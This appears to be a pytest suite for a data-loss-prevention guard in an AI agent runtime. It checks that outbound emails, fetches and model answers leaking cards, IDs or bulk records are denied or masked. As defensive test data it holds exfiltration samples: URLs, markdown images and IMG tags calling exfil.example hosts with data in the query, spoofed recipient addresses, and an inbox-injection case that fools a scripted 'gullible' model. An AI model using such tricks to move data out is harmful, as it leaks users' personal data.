import base64
import json

import pytest

from ags.core import (
    Context,
    Principal,
    Runtime,
    ScriptedModel,
    ToolCall,
    ToolSpec,
    build_env,
    call,
)
from ags.dlp import (
    DLPOutputGuard,
    OutboundGuard,
    luhn,
    normalize,
    redact,
    scan,
)

CTX = Context("r", "a", Principal("asha", tenant="acme"))
EMAIL = ToolSpec("send_email", "external", "high")
GUARD = OutboundGuard(allow=("acme.example",))
CARD = "4111 1111 1111 1111"


def kinds(text):
    return sorted(m.kind for m in scan(text))


def send(to, body, guard=GUARD):
    args = {"to": to, "subject": "s", "body": body}
    return guard.check(
        CTX, EMAIL, ToolCall("1", "send_email", args)
    )


@pytest.mark.parametrize(
    "text, expected",
    [
        ("4111-1111-1111-1111", ["card"]),
        ("4111.1111.1111.1111", ["card"]),
        ("4111 1111 1111 1112", []),  # fails Luhn
        ("on 2026-11-01 at 10:30", []),  # a date, not a phone
        ("call +1 415 555 0134", ["phone"]),
        ("ssn 123-45-6789", ["national_id"]),
        ("key sk_live_abcdefghijklmnop1234", ["secret"]),
    ],
)
def test_detectors_and_validation(text, expected):
    assert kinds(text) == expected
    assert luhn("4111111111111111") and not luhn(
        "4111111111111112"
    )


@pytest.mark.parametrize(
    "disguised",
    [
        "\uff14\uff11\uff11\uff11 \uff11\uff11\uff11\uff11 "
        "\uff11\uff11\uff11\uff11 \uff11\uff11\uff11\uff11",
        "4111\u200b1111\u200b1111\u200b1111",
        base64.b64encode(CARD.encode()).decode(),
        "4111%201111%201111%201111",
        "&#52;111 1111 1111 1111",
    ],
)
def test_unicode_and_encoded_cards_are_found(disguised):
    assert kinds(disguised) == ["card"]


def test_redact_by_policy():
    text = f"{CARD} asha@acme.example 123-45-6789"
    out = redact(text, {"card": "mask", "email": "allow"})
    assert (
        out
        == "**** **** **** 1111 asha@acme.example [national_id]"
    )
    assert normalize("\uff21\u200bB") == "AB"


@pytest.mark.parametrize(
    "to",
    [
        "PARTNER@EXFIL.EXAMPLE",
        "Asha <partner@exfil.example>",
        '"asha@acme.example" <partner@exfil.example>',
        "asha@acme.example, partner@exfil.example",
        "partner@acme.example.exfil.example",
        "partner@evilacme.example",
        "partner",
    ],
)
def test_recipient_tricks_are_denied(to):
    assert send(to, f"Card: {CARD}").verdict == "deny"


def test_allowed_domains_and_harmless_outside_mail():
    assert send("asha@support.acme.example", CARD).allowed
    assert send("ASHA@ACME.EXAMPLE.", CARD).allowed
    assert send("partner@exfil.example", "Thanks, noted.").allowed


def test_bulk_is_denied_even_inside_and_when_encoded():
    env, _ = build_env()
    rows = json.dumps(env.export_customers())
    assert "3 records" in send("ben@acme.example", rows).reason
    hidden = base64.b64encode(rows.encode()).decode()
    assert "bulk" in send("ben@acme.example", hidden).reason


def test_url_and_link_exfil_are_denied():
    fetch = ToolSpec("fetch_url", "external")
    url = "https://collect.exfil.example/?e=asha%40acme.example"
    d = GUARD.check(
        CTX, fetch, ToolCall("1", "fetch_url", {"url": url})
    )
    assert d.verdict == "deny"
    body = (
        "Hi! ![x](https://img.exfil.example/a.png?d=" + "Z" * 30
    )
    assert (
        "data-carrying link"
        in send("ben@acme.example", body).reason
    )


def test_output_guard_masks_blocks_and_allows():
    guard = DLPOutputGuard(allow=("acme.example",))
    masked = guard.check_output(CTX, f"Card {CARD}.")
    assert masked.allowed and masked.text == (
        "Card **** **** **** 1111."
    )
    img = '<IMG SRC="https://t.exfil.example/p?u=asha@acme.example">'
    assert guard.check_output(CTX, img).verdict == "deny"
    many = "a@x.example b@x.example c@x.example"
    assert guard.check_output(CTX, many).verdict == "deny"
    ok = (
        "See [help](https://acme.example/help?q=" + "r" * 30 + ")"
    )
    assert guard.check_output(CTX, ok).allowed


def test_inbox_attack_blocked_in_runtime():
    env, tools = build_env()
    model = ScriptedModel([call("read_inbox")], gullible=True)
    res = Runtime(tools, [GUARD]).run(CTX.principal, "t", model)
    assert env.sent == []
    assert res.denied[0][1].guard == "outbound_dlp"


def test_example_main(capsys):
    from ch09_data_loss_prevention import main

    main()
    out = capsys.readouterr().out
    assert "bulk personal data (3 records" in out
    assert "answer: Card for C-100: **** **** **** 1111." in out
    assert "answer blocked by dlp_output:" in out
